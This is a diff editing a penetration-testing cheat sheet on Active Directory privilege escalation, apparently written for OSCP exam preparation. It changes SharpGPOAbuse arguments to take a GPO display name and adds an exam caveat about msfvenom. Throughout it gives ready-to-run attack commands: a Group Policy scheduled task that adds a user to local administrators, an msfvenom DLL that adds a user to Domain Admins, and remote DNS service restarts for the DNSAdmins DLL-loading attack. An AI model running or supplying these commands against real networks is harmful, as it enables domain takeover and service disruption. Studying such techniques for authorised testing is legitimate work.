@@ -155,7 +155,7 @@ Both modules crawl SYSVOL over the existing SMB session and decrypt any cpasswor
 
 **Explanation:** If a user/group has `GenericWrite`/`WriteProperty`/`GenericAll` on a GPO object (found via BloodHound's `GPLink`/GPO ACL edges) that is linked to an OU containing high-value targets (e.g. Domain Controllers, an admin workstation OU), that GPO can be modified to push an Immediate Scheduled Task or an Immediate User Task that runs attacker-controlled commands as SYSTEM (computer-targeted task) or as the logged-on user, on every machine in scope the next time policy refreshes.
 
-**Prerequisites:** Confirmed GPO-edit ACE on a specific GPO (BloodHound: `GenericAll`/`WriteDacl`/`WriteOwner` on a `GPO` node with a `GPLink` to the target OU), the GPO's GUID (from BloodHound or `Get-GPO -All`).
+**Prerequisites:** Confirmed GPO-edit ACE on a specific GPO (BloodHound: `GenericAll`/`WriteDacl`/`WriteOwner` on a `GPO` node with a `GPLink` to the target OU), the GPO's display name (from BloodHound or `Get-GPO -All`).
 
 ```
 # SharpGPOAbuse.exe — from a foothold with the vulnerable GPO edit rights
@@ -163,15 +163,15 @@ Both modules crawl SYSVOL over the existing SMB session and decrypt any cpasswor
 SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" \
     --Author CORP\lowpriv --Command "cmd.exe" \
     --Arguments "/c net localgroup administrators corp\\lowpriv /add" \
-    --GPOName "{31B2F340-016D-11D2-945F-00C04FB984F9}"
+    --GPOName "Default Domain Policy"
 
 # --AddUserTask: runs as whichever user logs on and is in scope of the GPO
 SharpGPOAbuse.exe --AddUserTask --TaskName "Updater" \
     --Author CORP\lowpriv --Command "cmd.exe" \
     --Arguments "/c net localgroup administrators corp\\lowpriv /add" \
-    --GPOName "{31B2F340-016D-11D2-945F-00C04FB984F9}"
+    --GPOName "Default Domain Policy"
 ```
-`--GPOName` takes the GPO's GUID (curly braces included), not its display name. Confirm the target GPO GUID first: `Get-GPO -All | Select DisplayName, Id`.
+`--GPOName` takes the GPO's display name (SharpGPOAbuse resolves it via an LDAP `displayName` lookup), not its GUID. Confirm the exact target GPO display name first: `Get-GPO -All | Select DisplayName, Id`.
 
 **This does not take effect until Group Policy refreshes on the target.** From a session on the target machine, force it immediately rather than waiting for the default ~90-minute (±30 min randomized offset) client refresh interval:
 ```
@@ -196,7 +196,7 @@ python3 pyGPOAbuse.py CORP.LOCAL/lowpriv:'Password123!' -gpo-id 31B2F340-016D-11
 **Prerequisites:** Membership in `DNSAdmins` (or equivalent write access to `dnsserver` RPC config), network path to the DC's DNS service, a UNC-reachable path (SMB share) hosting the malicious DLL, and rights/ability to restart the DNS service (`DNSAdmins` members typically can do this remotely via `sc.exe`/`dnscmd` against the DC, or it can be done from a session already on the box).
 
 ```bash
-# 1. Host a malicious DLL (msfvenom payload or custom) on an attacker-controlled SMB share
+# 1. Host a malicious DLL (custom C DLL, or msfvenom payload as a convenience alternative) on an attacker-controlled SMB share
 msfvenom -p windows/x64/exec CMD='net group "Domain Admins" lowpriv /add /domain' \
     -f dll -o evil.dll
 
@@ -208,6 +208,8 @@ sc.exe \\DC01 stop dns
 sc.exe \\DC01 start dns
 ```
 **Restarting the DNS service is disruptive and noisy** — DNS resolution on that DC is briefly unavailable while the service bounces, which can affect other clients/services relying on it for name resolution mid-engagement. Expect this to be visible in monitoring and factor the brief outage into timing on a live target.
+
+**Exam caveat:** the `msfvenom` DLL generation above is a labeled convenience alternative, not a requirement — any DLL (a minimal custom C DLL exporting `DllMain`, or any other payload generator) works equally well for the `serverlevelplugindll` load, since this is standalone payload generation and not an interactive Metasploit/Meterpreter session or module run against the target. On the OSCP exam, prefer a non-Metasploit DLL if in doubt about scope; the exploitation primitive itself (`dnscmd`/`sc.exe`) does not touch Metasploit at all.
 
 **Faster (nxc):** netexec automates the whole set-DLL-and-restart flow in one module call once you hold valid DNSAdmins-member credentials:
 ```bash
